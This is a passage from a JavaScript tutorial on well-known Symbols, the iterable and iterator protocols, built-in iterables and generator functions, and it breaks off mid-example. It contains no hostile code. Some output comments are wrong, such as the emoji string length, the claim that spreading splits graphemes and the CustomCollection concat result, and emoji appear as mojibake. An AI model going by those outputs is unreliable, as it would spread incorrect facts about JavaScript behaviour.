'Hello World'.replace(pattern, 'Hi');  // 'Hi World'

// Symbol.matchAll (ES2020)
class MultiMatcher {
  constructor(pattern) {
    this.pattern = pattern;
  }

  [Symbol.matchAll](str) {
    let matches = [];
    for (let i = 0; i < str.length; i++) {
      if (str[i] === this.pattern) {
        matches.push({
          0: this.pattern,
          index: i,
          input: str
        });
      }
    }
    return matches[Symbol.iterator]();
  }
}

let matcher = new MultiMatcher('l');
for (let m of 'hello'.matchAll(matcher)) {
  console.log(m);                // Each 'l' match
}
```

---

### 10.2.8 Other Well-known Symbols

**Symbol.unscopables, Symbol.isConcatSpreadable, Symbol.for(), etc.**

```javascript
// Symbol.unscopables - exclude properties from with statement
let obj = {
  prop: 'value',
  [Symbol.unscopables]: {
    prop: true  // Exclude prop from with block
  }
};

with (obj) {
  console.log(prop);  // ReferenceError (excluded)
}

// Symbol.isConcatSpreadable - control array spreading
let arr1 = [1, 2, 3];
let arr2 = [4, 5];
arr2[Symbol.isConcatSpreadable] = false;

[].concat(arr1, arr2);           // [1, 2, 3, [4, 5]] (arr2 not spread)

arr2[Symbol.isConcatSpreadable] = true;
[].concat(arr1, arr2);           // [1, 2, 3, 4, 5] (arr2 spread)

// Real-world: string representation
class Vector {
  constructor(...components) {
    this.components = components;
  }

  [Symbol.isConcatSpreadable] = false;

  toString() {
    return `Vector(${this.components.join(', ')})`;
  }
}

let v = new Vector(1, 2, 3);
[1, 2].concat(v);                // [1, 2, Vector(1, 2, 3)]

// Symbol.for with realm safety
let key = Symbol.for('global.app');
let same = Symbol.for('global.app');

key === same;                    // true (cross-realm)
Symbol.keyFor(key);              // 'global.app'

// All well-known symbols as reference
console.log({
  iterator: Symbol.iterator,
  asyncIterator: Symbol.asyncIterator,
  match: Symbol.match,
  matchAll: Symbol.matchAll,
  replace: Symbol.replace,
  search: Symbol.search,
  species: Symbol.species,
  split: Symbol.split,
  toPrimitive: Symbol.toPrimitive,
  toStringTag: Symbol.toStringTag,
  unscopables: Symbol.unscopables,
  hasInstance: Symbol.hasInstance,
  isConcatSpreadable: Symbol.isConcatSpreadable
});

// Practical: implementing multiple protocols
class CustomCollection {
  constructor(items) {
    this.items = items;
  }

  // Iterator protocol
  [Symbol.iterator]() {
    return this.items[Symbol.iterator]();
  }

  // String representation
  get [Symbol.toStringTag]() {
    return 'CustomCollection';
  }

  // Primitive conversion
  [Symbol.toPrimitive](hint) {
    if (hint === 'number') {
      return this.items.length;
    }
    return `CustomCollection(${this.items.length})`;
  }

  // Array concatenation
  [Symbol.isConcatSpreadable] = true;

  // instanceof checking
  static [Symbol.hasInstance](obj) {
    return obj && Array.isArray(obj.items);
  }
}

let coll = new CustomCollection([1, 2, 3]);
[...coll];                       // [1, 2, 3]
String(coll);                    // 'CustomCollection(3)'
Number(coll);                    // 3
[].concat(coll);                 // [1, 2, 3] (spread)
coll instanceof CustomCollection;  // true
```

---

## Summary: Well-known Symbols - Chapter 10

**Complete Chapter 10: Symbols**

**Key Takeaways:**

1. **Symbols are unique primitives** - no two symbols are equal except global symbols
2. **Hidden properties** - symbol keys don't appear in for...in or Object.keys()
3. **Private state** - truly private without needing conventions like underscore
4. **Well-known symbols customize behavior** - iterator, toStringTag, toPrimitive, etc.
5. **Protocols enable duck typing** - objects don't need to inherit, just implement protocol
6. **Global registry** - Symbol.for()/keyFor() for cross-module communication

**All Symbol Methods:**

| Method | Purpose |
|--------|---------|
| `Symbol()` | Create unique symbol |
| `Symbol(description)` | Create with debug description |
| `Symbol.for(key)` | Get/create global symbol |
| `Symbol.keyFor(symbol)` | Get key if global |
| `.description` | Get symbol description |
| `Symbol.iterator` | Enable for...of |
| `Symbol.asyncIterator` | Enable for await...of |
| `Symbol.toStringTag` | Customize [object Type] |
| `Symbol.toPrimitive` | Control coercion |
| `Symbol.hasInstance` | Custom instanceof |
| `Symbol.species` | Control derived constructor |
| `Symbol.match/replace/search/split` | Customize regex |
| `Symbol.isConcatSpreadable` | Control array concat |
| `Symbol.unscopables` | Exclude from with() |

**Common Use Cases:**
- Creating truly private properties
- Implementing custom iterators
- Enabling for...of loops
- Defining internal methods
- Cross-module shared symbols
- Customizing built-in operations
- Protocol implementation (iterator, async iterator, etc.)
- Duck typing with well-known symbols

**Best Practices:**
- Use symbols for private state instead of conventions
- Use global symbols only for library APIs
- Document which symbols are public vs private
- Use well-known symbols to implement protocols
- Combine with classes for encapsulation
- Document symbol purposes with descriptions
- Consider user expectations for duck typing

## 10.3 Symbols Summary

| Well-Known Symbol | Purpose |
|------------------|---------|
| `Symbol.iterator` | Define iteration behavior |
| `Symbol.toStringTag` | Customize `Object.prototype.toString` |
| `Symbol.hasInstance` | Customize `instanceof` |
| `Symbol.toPrimitive` | Customize type conversion |
| `Symbol.species` | Constructor for derived objects |

---

**End of Chapter 10: Symbols**


# 11-Iterators-and-Generators.md

# 11 Iterators and Generators

The iteration protocol defines how objects produce sequences of values. Generators are functions that can pause and resume, implementing the iterator protocol.

---

## Iteration Protocols


## The Iterable Protocol

### What is the Iterable Protocol?

The **iterable protocol** defines how objects become iterable, allowing them to work with `for...of` loops, spread operator, and destructuring.

**Core requirement:** An object must have a method accessible via `Symbol.iterator` that returns an iterator object.

### Interface Definition

```javascript
// An object is iterable if it has this method:
object[Symbol.iterator]() {
  // Must return an iterator object
  return {
    next() { /* ... */ }
  };
}
```

### Simple Example

```javascript
// âœ… Iterable object
const iterable = {
  data: [1, 2, 3],
  [Symbol.iterator]() {
    let index = 0;
    return {
      next: () => {
        if (index < this.data.length) {
          return { value: this.data[index++], done: false };
        }
        return { done: true };
      }
    };
  }
};

// Now you can use it with for...of
for (const value of iterable) {
  console.log(value);  // 1, 2, 3
}
```

### Key Points

- The iterable protocol defines **how** to iterate
- Does NOT specify iteration behavior
- Enables multiple iteration methods on same data
- Foundation for all iteration in JavaScript

---

## The Iterator Protocol

### What is the Iterator Protocol?

The **iterator protocol** defines the `next()` method that returns objects with `{ value, done }` structure.

**Core requirement:** An iterator must have a `next()` method that returns a result object.

### Result Object Structure

```javascript
// The result of calling iterator.next()
{
  value: any,        // Current value (optional if done: true)
  done: boolean      // true when iteration complete
}
```

### Simple Example

```javascript
// âœ… Iterator object
const iterator = {
  values: ['a', 'b', 'c'],
  index: 0,
  
  next() {
    if (this.index < this.values.length) {
      return {
        value: this.values[this.index++],
        done: false
      };
    }
    return { done: true };
  }
};

// Manual iteration
console.log(iterator.next());  // { value: 'a', done: false }
console.log(iterator.next());  // { value: 'b', done: false }
console.log(iterator.next());  // { value: 'c', done: false }
console.log(iterator.next());  // { done: true }
```

### Iterator with Return Value

```javascript
const iterator = {
  values: [1, 2, 3],
  index: 0,
  
  next() {
    if (this.index < this.values.length) {
      return {
        value: this.values[this.index++],
        done: false
      };
    }
    return {
      value: 'FINISHED',  // Optional return value
      done: true
    };
  }
};

// Manual iteration
let result = iterator.next();
while (!result.done) {
  console.log(result.value);  // 1, 2, 3
  result = iterator.next();
}
console.log(result.value);  // 'FINISHED'
```

### Key Points

- Iterator protocol defines **mechanism** of iteration
- `next()` is the only required method
- Controls iteration state internally
- Can be called manually or automatically

---

## Symbol.iterator

### Connecting Iterable and Iterator

`Symbol.iterator` is the bridge between:
- **Iterable** (has `Symbol.iterator` method)
- **Iterator** (returned by that method, has `next()`)

```javascript
// The connection
object[Symbol.iterator]() â†’ returns â†’ iterator
                                        â†“
                                    has next()
                                        â†“
                                    returns { value, done }
```

### Complete Example

```javascript
class CountUp {
  constructor(max) {
    this.max = max;
  }

  // Make it iterable
  [Symbol.iterator]() {
    let current = 1;
    const max = this.max;
    
    // Return an iterator
    return {
      next() {
        if (current <= max) {
          return { value: current++, done: false };
        }
        return { done: true };
      }
    };
  }
}

const counter = new CountUp(3);

// Works with for...of
for (const num of counter) {
  console.log(num);  // 1, 2, 3
}

// Works with spread operator
const arr = [...counter];  // [1, 2, 3]

// Works with destructuring
const [first, second] = counter;
console.log(first, second);  // 1, 2
```

### Checking if Something is Iterable

```javascript
// âœ… Check if object has Symbol.iterator
function isIterable(obj) {
  return obj != null && typeof obj[Symbol.iterator] === 'function';
}

console.log(isIterable([1, 2, 3]));        // true
console.log(isIterable('hello'));         // true
console.log(isIterable(new Map()));       // true
console.log(isIterable(42));              // false
console.log(isIterable({ a: 1 }));        // false

// More thorough check
function getIterator(obj) {
  if (!isIterable(obj)) {
    throw new TypeError(`Object is not iterable`);
  }
  return obj[Symbol.iterator]();
}

const iter = getIterator([1, 2]);
console.log(iter.next());  // { value: 1, done: false }
```

### Symbol.iterator is a Symbol

```javascript
// Symbol.iterator is a well-known symbol
console.log(typeof Symbol.iterator);        // 'symbol'
console.log(Symbol.iterator.toString());    // 'Symbol(Symbol.iterator)'

// It's the same across all code
class A {
  [Symbol.iterator]() { return { next: () => ({ done: true }) }; }
}
class B {
  [Symbol.iterator]() { return { next: () => ({ done: true }) }; }
}

const a = new A();
const b = new B();

// Same symbol
console.log(Object.getOwnPropertySymbols(a)[0] === Symbol.iterator);  // true
console.log(Object.getOwnPropertySymbols(b)[0] === Symbol.iterator);  // true
```

---

## Making Objects Iterable

### Pattern 1: Simple Object Iteration

```javascript
// Iterate over object values
const person = {
  name: 'Alice',
  age: 30,
  city: 'NYC',
  
  [Symbol.iterator]() {
    const values = Object.values(this);
    let index = 0;
    
    return {
      next: () => index < values.length
        ? { value: values[index++], done: false }
        : { done: true }
    };
  }
};

for (const value of person) {
  console.log(value);  // 'Alice', 30, 'NYC'
}
```

### Pattern 2: Iterating Object Entries

```javascript
const config = {
  host: 'localhost',
  port: 3000,
  debug: true,
  
  [Symbol.iterator]() {
    const entries = Object.entries(this);
    let index = 0;
    
    return {
      next: () => index < entries.length
        ? { value: entries[index++], done: false }
        : { done: true }
    };
  }
};

for (const [key, value] of config) {
  console.log(`${key}: ${value}`);
}
// Output:
// host: localhost
// port: 3000
// debug: true
```

### Pattern 3: Filtering Iteration

```javascript
// Iterate over even numbers only
class Numbers {
  constructor(max) {
    this.max = max;
  }
  
  [Symbol.iterator]() {
    let current = 0;
    const max = this.max;
    
    return {
      next: () => {
        while (current <= max) {
          if (current % 2 === 0) {
            return { value: current++, done: false };
          }
          current++;
        }
        return { done: true };
      }
    };
  }
}

for (const num of new Numbers(10)) {
  console.log(num);  // 0, 2, 4, 6, 8, 10
}
```

### Pattern 4: Stateful Iteration

```javascript
// Track iteration state
class Fibonacci {
  constructor(maxCount) {
    this.maxCount = maxCount;
  }
  
  [Symbol.iterator]() {
    let count = 0;
    let current = 0;
    let next = 1;
    
    return {
      next: () => {
        if (count < this.maxCount) {
          const value = current;
          [current, next] = [next, current + next];
          count++;
          return { value, done: false };
        }
        return { done: true };
      }
    };
  }
}

for (const num of new Fibonacci(8)) {
  console.log(num);  // 0, 1, 1, 2, 3, 5, 8, 13
}
```

### Pattern 5: Infinite Iterator

```javascript
// Be careful with infinite iterators!
class InfiniteCounter {
  constructor(start = 0) {
    this.start = start;
  }
  
  [Symbol.iterator]() {
    let value = this.start;
    
    return {
      next: () => ({ value: value++, done: false })
    };
  }
}

// MUST use break or take() pattern
let count = 0;
for (const num of new InfiniteCounter(100)) {
  console.log(num);
  if (++count >= 5) break;  // 100, 101, 102, 103, 104
}
```

### Pattern 6: Multi-Value Iteration

```javascript
// Yield multiple values per iteration
class Pairs {
  constructor(arr) {
    this.arr = arr;
  }
  
  [Symbol.iterator]() {
    let index = 0;
    const arr = this.arr;
    
    return {
      next: () => {
        if (index < arr.length) {
          const pair = [arr[index], arr[index + 1]];
          index += 2;
          return { value: pair, done: false };
        }
        return { done: true };
      }
    };
  }
}

for (const [a, b] of new Pairs([1, 2, 3, 4, 5])) {
  console.log(a, b);
}
// Output:
// 1 2
// 3 4
// 5 undefined
```

---

## Practical Examples

### Example 1: Range Iterator

```javascript
class Range {
  constructor(start, end, step = 1) {
    this.start = start;
    this.end = end;
    this.step = step;
  }
  
  [Symbol.iterator]() {
    let current = this.start;
    const end = this.end;
    const step = this.step;
    
    return {
      next: () => {
        if (
          (step > 0 && current < end) ||
          (step < 0 && current > end)
        ) {
          const value = current;
          current += step;
          return { value, done: false };
        }
        return { done: true };
      }
    };
  }
  
  // Also make it reversible
  reverse() {
    return new Range(this.end - 1, this.start - 1, -this.step);
  }
}

// Usage
console.log([...new Range(1, 5)]);           // [1, 2, 3, 4]
console.log([...new Range(0, 10, 2)]);       // [0, 2, 4, 6, 8]
console.log([...new Range(10, 0, -1)]);      // [10, 9, 8, ..., 1]
```

### Example 2: Tree Traversal

```javascript
class TreeNode {
  constructor(value, children = []) {
    this.value = value;
    this.children = children;
  }
  
  // Depth-first traversal
  *[Symbol.iterator]() {
    yield this.value;
    for (const child of this.children) {
      yield* child;  // Delegate to child
    }
  }
}

const tree = new TreeNode(1, [
  new TreeNode(2, [
    new TreeNode(4),
    new TreeNode(5)
  ]),
  new TreeNode(3, [
    new TreeNode(6)
  ])
]);

console.log([...tree]);  // [1, 2, 4, 5, 3, 6]
```

### Example 3: Linked List

```javascript
class LinkedList {
  constructor() {
    this.head = null;
  }
  
  append(value) {
    const node = { value, next: null };
    
    if (!this.head) {
      this.head = node;
    } else {
      let current = this.head;
      while (current.next) {
        current = current.next;
      }
      current.next = node;
    }
  }
  
  [Symbol.iterator]() {
    let current = this.head;
    
    return {
      next: () => {
        if (current) {
          const value = current.value;
          current = current.next;
          return { value, done: false };
        }
        return { done: true };
      }
    };
  }
}

const list = new LinkedList();
list.append(1);
list.append(2);
list.append(3);

for (const value of list) {
  console.log(value);  // 1, 2, 3
}

console.log([...list]);  // [1, 2, 3]
```

### Example 4: Filtered Iterator

```javascript
class FilteredIterable {
  constructor(iterable, predicate) {
    this.iterable = iterable;
    this.predicate = predicate;
  }
  
  [Symbol.iterator]() {
    const iterator = this.iterable[Symbol.iterator]();
    const predicate = this.predicate;
    
    return {
      next() {
        let result = iterator.next();
        while (!result.done) {
          if (predicate(result.value)) {
            return result;
          }
          result = iterator.next();
        }
        return { done: true };
      }
    };
  }
}

// Usage
const numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
const evens = new FilteredIterable(numbers, x => x % 2 === 0);

console.log([...evens]);  // [2, 4, 6, 8, 10]
```

---

## Common Patterns

### Pattern: Iterator Wrapper

```javascript
// Generic iterator wrapper
function makeIterable(array) {
  return {
    [Symbol.iterator]() {
      let index = 0;
      return {
        next: () => index < array.length
          ? { value: array[index++], done: false }
          : { done: true }
      };
    }
  };
}

const wrapped = makeIterable([10, 20, 30]);
for (const value of wrapped) {
  console.log(value);  // 10, 20, 30
}
```

### Pattern: Lazy Iterator

```javascript
// Only compute values when requested
class LazyMap {
  constructor(iterable, transform) {
    this.iterable = iterable;
    this.transform = transform;
  }
  
  [Symbol.iterator]() {
    const iterator = this.iterable[Symbol.iterator]();
    const transform = this.transform;
    
    return {
      next() {
        const result = iterator.next();
        if (!result.done) {
          result.value = transform(result.value);
        }
        return result;
      }
    };
  }
}

const numbers = [1, 2, 3, 4, 5];
const squared = new LazyMap(numbers, x => x * x);

console.log([...squared]);  // [1, 4, 9, 16, 25]
```

### Pattern: Iterator Composition

```javascript
// Combine multiple iterators
function* chain(...iterables) {
  for (const iterable of iterables) {
    yield* iterable;
  }
}

const result = [...chain([1, 2], [3, 4], [5])];
console.log(result);  // [1, 2, 3, 4, 5]
```

---

## Best Practices

### âœ… DO

```javascript
// âœ… Cache the this reference when needed
class Good {
  [Symbol.iterator]() {
    let index = 0;
    const data = this.data;  // Cache this.data
    
    return {
      next: () => index < data.length
        ? { value: data[index++], done: false }
        : { done: true }
    };
  }
}

// âœ… Use generators for simpler code (see Module 11.3)
class SimpleClass {
  *[Symbol.iterator]() {
    yield* this.data;
  }
}

// âœ… Make iteration state independent
class Independent {
  [Symbol.iterator]() {
    // Creates new state each time
    let current = 0;
    return {
      next: () => {
        if (current < this.data.length) {
          return { value: this.data[current++], done: false };
        }
        return { done: true };
      }
    };
  }
}
```

### âŒ DON'T

```javascript
// âŒ Don't expose iterator state directly
class Bad1 {
  constructor() {
    this.iterator = null;
    this.index = 0;  // Shared state!
  }
  
  [Symbol.iterator]() {
    return this;  // Returns same object
  }
  
  next() {
    if (this.index < this.data.length) {
      return { value: this.data[this.index++], done: false };
    }
    return { done: true };
  }
}

// âŒ Don't forget to return an iterator
class Bad2 {
  [Symbol.iterator]() {
    // âŒ Returns undefined, not an iterator!
    return this.data;
  }
}

// âŒ Don't modify data during iteration
class Bad3 {
  constructor(data) {
    this.data = data;
  }
  
  [Symbol.iterator]() {
    let index = 0;
    return {
      next: () => {
        // âŒ Dangerous if data is modified
        if (index < this.data.length) {
          return { value: this.data[index++], done: false };
        }
        return { done: true };
      }
    };
  }
}
```

### Performance Considerations

```javascript
// âœ… Iterator reuse is cheap (new state each iteration)
class Efficient {
  data = [1, 2, 3, 4, 5];
  
  [Symbol.iterator]() {
    let index = 0;
    return {
      next: () => index < this.data.length
        ? { value: this.data[index++], done: false }
        : { done: true }
    };
  }
}

// Can iterate multiple times efficiently
const obj = new Efficient();
for (const x of obj) { /* ... */ }  // Creates new iterator
for (const x of obj) { /* ... */ }  // Creates another new iterator

// âŒ Avoid expensive operations in iteration
class Inefficient {
  [Symbol.iterator]() {
    return {
      next: () => {
        // âŒ Expensive computation per next() call
        const expensive = computeExpensiveValue();
        return { value: expensive, done: false };
      }
    };
  }
}
```

---

## Summary

### Key Concepts

| Concept | Purpose |
|---------|---------|
| **Iterable Protocol** | Defines how objects become iterable |
| **Iterator Protocol** | Defines the `next()` mechanism |
| **Symbol.iterator** | The method key that connects them |
| **for...of loop** | Consumes iterables automatically |
| **Spread operator** | Converts iterables to arrays |

### Protocol Requirements

**Iterable (object) must have:**
- Method at `[Symbol.iterator]` key
- Returns an iterator object

**Iterator (returned object) must have:**
- `next()` method
- Returns `{ value, done }` object
- `done` = true when finished

### Common Use Cases

```javascript
// 1. Custom iteration logic
class Custom {
  [Symbol.iterator]() { /* ... */ }
}

// 2. Filtering data
class Filtered {
  [Symbol.iterator]() { /* ... */ }
}

// 3. Lazy evaluation
class Lazy {
  [Symbol.iterator]() { /* ... */ }
}

// 4. Multiple iteration strategies
class Multi {
  [Symbol.iterator]() { /* forward */ }
  reverse() { /* backward */ }
}
```

### Next Steps

- **Module 11.2** - Learn about built-in iterables (Array, String, Map, Set)
- **Module 11.3** - Use generators to simplify iterator creation
- **Module 11.4** - Async iterators for asynchronous operations
## Generators, Built-in Iterables & Async Iterators
## Part 1: Built-in Iterables (Module 11.2)


## Built-in Iterables Overview

### What Objects are Iterable?

JavaScript provides several built-in iterable objects:

```javascript
// âœ… All of these have Symbol.iterator
const arr = [1, 2, 3];
const str = "hello";
const map = new Map([['a', 1], ['b', 2]]);
const set = new Set([1, 2, 3]);
const typed = new Uint8Array([1, 2, 3]);

// âœ… Check if iterable
function isIterable(obj) {
  return obj != null && typeof obj[Symbol.iterator] === 'function';
}

console.log(isIterable(arr));      // true
console.log(isIterable(str));      // true
console.log(isIterable(map));      // true
console.log(isIterable(set));      // true
console.log(isIterable(typed));    // true

// âŒ These are NOT iterable
console.log(isIterable(42));       // false
console.log(isIterable({ a: 1 })); // false
```

---

## Arrays

### Array Iteration

```javascript
// âœ… Arrays are iterable
const arr = [10, 20, 30];

// 1. for...of loop
for (const value of arr) {
  console.log(value);  // 10, 20, 30
}

// 2. Spread operator
const copy = [...arr];  // [10, 20, 30]

// 3. Destructuring
const [first, second] = arr;  // 10, 20

// 4. Array methods
const doubled = [...arr].map(x => x * 2);

// 5. Manual iteration
const iterator = arr[Symbol.iterator]();
console.log(iterator.next());  // { value: 10, done: false }
console.log(iterator.next());  // { value: 20, done: false }
```

### Array Iterator Details

```javascript
// Array iterators are independent
const arr = [1, 2, 3];
const iter1 = arr[Symbol.iterator]();
const iter2 = arr[Symbol.iterator]();

console.log(iter1.next());  // { value: 1, done: false }
console.log(iter1.next());  // { value: 2, done: false }
console.log(iter2.next());  // { value: 1, done: false }  <- iter2 is independent

// Arrays also provide other iteration methods
arr.forEach(x => console.log(x));  // 1, 2, 3
const mapped = arr.map(x => x * 2);
const filtered = arr.filter(x => x > 1);
```

### Array Subclass Iteration

```javascript
// Custom array subclass still works with for...of
class MyArray extends Array {
  // Inherits [Symbol.iterator] from Array
}

const custom = new MyArray(1, 2, 3);
for (const value of custom) {
  console.log(value);  // 1, 2, 3
}

// Override iterator behavior
class ReverseArray extends Array {
  [Symbol.iterator]() {
    let index = this.length - 1;
    return {
      next: () => index >= 0
        ? { value: this[index--], done: false }
        : { done: true }
    };
  }
}

const reversed = new ReverseArray(1, 2, 3);
console.log([...reversed]);  // [3, 2, 1]
```

---

## Strings

### String Iteration

```javascript
// âœ… Strings are iterable
const str = "hello";

// 1. for...of loop
for (const char of str) {
  console.log(char);  // h, e, l, l, o
}

// 2. Spread operator
const chars = [...str];  // ['h', 'e', 'l', 'l', 'o']

// 3. Destructuring
const [first, second] = str;  // 'h', 'e'

// 4. Manual iteration
const iterator = str[Symbol.iterator]();
console.log(iterator.next());  // { value: 'h', done: false }
```

### Unicode-Aware String Iteration

```javascript
// for...of handles Unicode correctly
const emoji = "ðŸ‘¨â€ðŸ‘©â€ðŸ‘§â€ðŸ‘¦";  // Family emoji (multi-code point)

console.log(emoji.length);  // 25 (length counts code units)
console.log([...emoji]);    // Correctly split into graphemes

// Character counting
const text = "Hello ðŸ‘‹";
console.log(text.length);    // 8 (wrong count)
console.log([...text].length); // 7 (correct count)

// UTF-16 surrogate pairs
const text2 = "ðŸ˜€";  // Emoji
console.log(text2.length);      // 2 (two UTF-16 code units)
console.log([...text2].length);  // 1 (one grapheme)
```

### String Processing with for...of

```javascript
// Convert to uppercase with for...of
function uppercase(str) {
  let result = '';
  for (const char of str) {
    result += char.toUpperCase();
  }
  return result;
}

console.log(uppercase("hello"));  // "HELLO"

// Count characters
function countChars(str) {
  return [...str].length;
}

console.log(countChars("hello"));  // 5
console.log(countChars("ðŸŽ‰"));     // 1

// Filter characters
function removeVowels(str) {
  return [...str].filter(ch => !'aeiouAEIOU'.includes(ch)).join('');
}

console.log(removeVowels("Hello World"));  // "Hll Wrld"
```

---

## Maps and Sets

### Map Iteration

```javascript
// âœ… Maps are iterable
const map = new Map([
  ['name', 'Alice'],
  ['age', 30],
  ['city', 'NYC']
]);

// 1. for...of over entries
for (const [key, value] of map) {
  console.log(`${key}: ${value}`);
}

// 2. Iterate just keys
for (const key of map.keys()) {
  console.log(key);  // 'name', 'age', 'city'
}

// 3. Iterate just values
for (const value of map.values()) {
  console.log(value);  // 'Alice', 30, 'NYC'
}

// 4. Iterate entries explicitly
for (const entry of map.entries()) {
  console.log(entry);  // ['name', 'Alice'], ['age', 30], etc.
}

// 5. Spread operator
const entries = [...map];  // [['name', 'Alice'], ['age', 30], ...]

// 6. Destructuring
const [first, second] = map;  // ['name', 'Alice'], ['age', 30]
```

### Set Iteration

```javascript
// âœ… Sets are iterable
const set = new Set([1, 2, 3, 2, 1]);

// 1. for...of loop
for (const value of set) {
  console.log(value);  // 1, 2, 3
}

// 2. Set methods return iterables
for (const value of set.values()) {
  console.log(value);  // 1, 2, 3
}

// 3. keys() returns same as values() for Set
for (const key of set.keys()) {
  console.log(key);  // 1, 2, 3
}

// 4. entries() returns [value, value] pairs
for (const [a, b] of set.entries()) {
  console.log(a === b);  // true
}

// 5. Spread operator
const arr = [...set];  // [1, 2, 3]

// 6. forEach method
set.forEach(value => console.log(value));
```

### WeakMap and WeakSet

```javascript
// âŒ WeakMap and WeakSet are NOT iterable
const weakMap = new WeakMap();
const weakSet = new WeakSet();

console.log(typeof weakMap[Symbol.iterator]);  // undefined
console.log(typeof weakSet[Symbol.iterator]);  // undefined

// Cannot use for...of with WeakMap/WeakSet
// for (const entry of weakMap) { }  // âŒ TypeError
```

---

## TypedArrays

### TypedArray Iteration

```javascript
// âœ… All TypedArrays are iterable
const uint8 = new Uint8Array([10, 20, 30]);
const float32 = new Float32Array([1.5, 2.5, 3.5]);
const int16 = new Int16Array([100, 200, 300]);

// 1. for...of loop
for (const value of uint8) {
  console.log(value);  // 10, 20, 30
}

// 2. Spread operator
const copy = [...float32];  // [1.5, 2.5, 3.5]

// 3. Map operations
const doubled = [...uint8].map(x => x * 2);  // [20, 40, 60]

// 4. Manual iteration
const iterator = int16[Symbol.iterator]();
console.log(iterator.next());  // { value: 100, done: false }
```

### TypedArray Types

```javascript
// All these are iterable:
new Int8Array([1, 2, 3]);
new Uint8Array([1, 2, 3]);
new Uint8ClampedArray([1, 2, 3]);
new Int16Array([1, 2, 3]);
new Uint16Array([1, 2, 3]);
new Int32Array([1, 2, 3]);
new Uint32Array([1, 2, 3]);
new Float32Array([1.5, 2.5, 3.5]);
new Float64Array([1.5, 2.5, 3.5]);
new BigInt64Array([100n, 200n, 300n]);
new BigUint64Array([100n, 200n, 300n]);

// Each maintains its type
const int8 = new Int8Array([127, -128]);
for (const value of int8) {
  console.log(typeof value);  // 'number'
}

// BigInt types preserve BigInt
const bigInt = new BigInt64Array([100n, 200n]);
for (const value of bigInt) {
  console.log(typeof value);  // 'bigint'
}
```

---

## DOM NodeLists

### NodeList Iteration

```javascript
// âœ… Modern NodeLists are iterable (most browsers)
const elements = document.querySelectorAll('div');

// 1. for...of loop
for (const element of elements) {
  console.log(element);
}

// 2. Spread operator
const arr = [...elements];

// 3. Map operations
const ids = [...elements].map(el => el.id);

// 4. Filter operations
const withClass = [...elements].filter(el => el.classList.length > 0);
```

### HTMLCollection vs NodeList

```javascript
// âœ… NodeList is iterable
const nodeList = document.querySelectorAll('div');
for (const element of nodeList) { }  // Works

// âš ï¸ HTMLCollection is iterable (in modern browsers)
const htmlCollection = document.getElementsByTagName('div');
for (const element of htmlCollection) { }  // Works

// âœ… Can always convert to array
const asArray = Array.from(nodeList);
const asArray2 = [...nodeList];

// âŒ Live collections be careful
const liveCollection = document.getElementsByClassName('my-class');
for (const element of liveCollection) {
  element.classList.remove('my-class');  // Modifies collection!
}
```

---

## Part 2: Generator Functions (Module 11.3)


## Generator Function Basics

### What are Generator Functions?

A **generator function** is a function that can be paused and resumed, making it easy to create iterators.

```javascript
// âœ… Generator function syntax
function* myGenerator() {
  yield 1;
  yield 2;
  yield 3;
}

// Calling generator returns an iterator
const iterator = myGenerator();
console.log(iterator.next());  // { value: 1, done: false }
console.log(iterator.next());  // { value: 2, done: false }
console.log(iterator.next());  // { value: 3, done: false }
console.log(iterator.next());  // { done: true }

// âœ… Use with for...of
for (const value of myGenerator()) {
  console.log(value);  // 1, 2, 3
}

// âœ… Use with spread operator
const arr = [...myGenerator()];  // [1, 2, 3]
```

### Generator Syntax Variations

```javascript
// Function declaration
function* gen1() {
  yield 1;
}

// Function expression
const gen2 = function*() {
  yield 2;
};

// Method in object
const obj = {
  *gen3() {
    yield 3;
  }
};

// Method in class
class MyClass {
  *gen4() {
    yield 4;
  }
  
  // Can also use computed property names
  *[Symbol.iterator]() {
    yield 5;
  }
}

// All work the same way
for (const x of gen1()) { }
for (const x of gen2()) { }
for (const x of obj.gen3()) { }
for (const x of new MyClass().gen4()) { }
```

---

## The yield Mechanism

### Basic yield

```javascript
function* counter() {
  console.log('start');
  yield 1;
  console.log('between 1 and 2');
  yield 2;
  console.log('between 2 and 3');
  yield 3;
  console.log('end');
}

const iter = counter();
console.log(iter.next());  // Logs 'start', returns { value: 1, done: false }
console.log(iter.next());  // Logs 'between 1 and 2', returns { value: 2, done: false }
console.log(iter.next());  // Logs 'between 2 and 3', returns { value: 3, done: false }
console.log(iter.next());  // Logs 'end', returns { done: true }
```

### Return Value from Generator

```javascript
// âœ… return value is ignored in for...of
function* withReturn() {
  yield 1;
  yield 2;
  return 'DONE';  // Not printed in for...of
}

for (const value of withReturn()) {
  console.log(value);  // 1, 2 (not 'DONE')
}

// âŒ But return value is returned in last next()
const iterator = withReturn();
console.log(iterator.next());  // { value: 1, done: false }
console.log(iterator.next());  // { value: 2, done: false }
console.log(iterator.next());  // { value: 'DONE', done: true }
```

### Early Exit with return

```javascript
function* earlyExit() {
  yield 1;
  yield 2;
  if (Math.random() > 0.5) {
    return;  // Early exit
  }
  yield 3;
}

// Sometimes yields 3, sometimes doesn't
for (const value of earlyExit()) {
  console.log(value);
}
```

### yield Expression Value

```javascript
// âœ… yield can receive values through next()
function* receiver() {
  const x = yield 'waiting for value';
  console.log('received:', x);
  
  const y = yield 'waiting for another';
  console.log('received:', y);
}

const iter = receiver();
console.log(iter.next());              // { value: 'waiting for value', done: false }
console.log(iter.next(10));            // Logs 'received: 10', returns { value: 'waiting for another', done: false }
console.log(iter.next(20));            // Logs 'received: 20', returns { done: true }
```

---

## Generator Delegation (yield*)

### What is yield*?

The `yield*` operator delegates to another iterable or generator.

```javascript
// âœ… Simple yield*
function* inner() {
  yield 1;
  yield 2;
}

function* outer() {
  yield* inner();
  yield 3;
}

console.log([...outer()]);  // [1, 2, 3]
```

### Recursive Generators with yield*

```javascript
// Tree traversal with yield*
function* traverse(node) {
  yield node.value;
  if (node.left) {
    yield* traverse(node.left);
  }
  if (node.right) {
    yield* traverse(node.right);
  }
}

const tree = {
  value: 1,
  left: { value: 2, left: { value: 4 }, right: { value: 5 } },
  right: { value: 3, right: { value: 6 } }
};

console.log([...traverse(tree)]);  // [1, 2, 4, 5, 3, 6]
```

### yield* with Arrays

```javascript
// yield* works with any iterable
function* flatten() {
  yield* [1, 2, 3];
  yield* 'abc';  // Strings are iterable
  yield* new Set([4, 5, 6]);
}

console.log([...flatten()]);  // [1, 2, 3, 'a', 'b', 'c', 4, 5, 6]
```

### Bidirectional Communication with yield*

```javascript
// Values passed through yield*
function* inner() {
  const x = yield 'inner';
  return x * 2;
}

function* outer() {
  const x = yield 'outer start';
